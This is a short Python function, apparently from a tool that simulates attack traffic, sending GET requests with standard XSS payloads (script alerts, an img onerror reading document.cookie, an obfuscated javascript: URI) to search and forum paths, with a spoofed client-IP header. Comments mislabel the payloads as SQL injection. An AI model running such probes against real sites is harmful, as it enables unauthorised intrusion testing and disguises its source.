import random
import requests

# basic XSS attempts (GETs)
def xss(target, source_ip, user_agent, **kwargs):

    #common paths + params
    paths =   [
                "forums/post.php?pid=",
                "search?s=",
                "search?query="
              ]
    #generic sqli
    attacks = [
                "<script>alert('xss')</script>",
                "<img src='http://url.to.file.which/not.exist' onerror=alert(document.cookie);>",
                "<IMG SRC=j&#X41vascript:alert('test2')>"
              ]


    headers = {'User-Agent': user_agent,
               'True-Client-IP': str(source_ip),
               'Content-Type': 'application/x-www-form-urlencoded'
              }

    count=random.randint(1,5)
    ret=""

    for i in range(count):

        # pick a random path and attack to try
        attack = random.choice(attacks)
        path = random.choice(paths)

        req = {
                   "method": "GET",
                   "url": "{}/{}{}".format(target,path,attack)
                 }
        response = requests.request(req['method'], req['url'], headers=headers).status_code
        ret += "sql_injection: got {} with {}\n".format(response,req['url'])


    return(ret)
